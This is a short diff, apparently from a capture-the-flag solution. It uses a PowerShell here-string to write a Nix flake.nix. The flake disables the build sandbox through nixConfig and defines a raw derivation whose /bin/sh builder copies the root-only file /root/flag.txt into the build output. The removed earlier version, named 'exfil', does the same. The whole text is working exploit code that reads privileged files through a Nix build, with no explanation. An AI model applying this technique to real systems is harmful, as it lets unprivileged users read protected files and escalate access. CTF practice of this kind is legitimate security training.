@@ -1,10 +1,22 @@
+@'
 {
-  outputs = { self, nixpkgs }: let
-    system = "x86_64-linux";
-    pkgs = import nixpkgs { inherit system; };
-  in {
-    packages.${system}.default = pkgs.runCommand "exfil" {} ''
-      cat /root/flag.txt > $out
-    '';
+  description = "Phoenix";
+
+  nixConfig = {
+    sandbox = false;
+  };
+
+  outputs = { self }: {
+    packages.x86_64-linux.default =
+      builtins.derivation {
+        name = "flag";
+        system = "x86_64-linux";
+        builder = "/bin/sh";
+        args = [
+          "-c"
+          "cat /root/flag.txt > $out"
+        ];
+      };
   };
 }
+'@ | Set-Content -Encoding utf8 flake.nix
